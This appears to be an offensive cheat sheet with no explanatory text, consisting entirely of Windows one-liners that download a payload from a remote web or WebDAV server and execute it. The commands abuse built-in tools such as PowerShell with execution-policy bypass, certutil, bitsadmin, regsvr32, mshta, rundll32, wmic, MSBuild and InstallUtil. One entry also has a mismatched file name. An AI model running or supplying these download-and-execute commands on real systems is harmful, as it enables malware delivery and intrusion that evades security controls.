```
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://server/payload.ps1')|iex"
```

```
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

```
cmd.exe /k < \\webdavserver\folder\batchfile.txt
```

```
certutil -urlcache -split -f http://server/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

```
certutil -urlcache -split -f http://server/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```

```
certutil -urlcache -split -f http://server/payload payload
```

```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```

```
bitsadmin /Transfer myJob http://server/file.b64 C:\users\username\file.b64 && certutil -decode C:\users\username\file.b64 C:\users\username\mallicious.exe && del C:\users\username\file.b64 && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\username\malicious.exe
```

```
regsvr32 /u /n /s /i:http://server/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\server\folder\payload.sct scrobj.dll
```

```
wmic os get /format:"https://server/payload.xsl"
```

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```

```
mshta http://webserver/payload.hta
```

```
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```
mshta \\webdavserver\folder\payload.hta
```

```
cscript //E:jscript \\webdavserver\folder\payload.txt
```
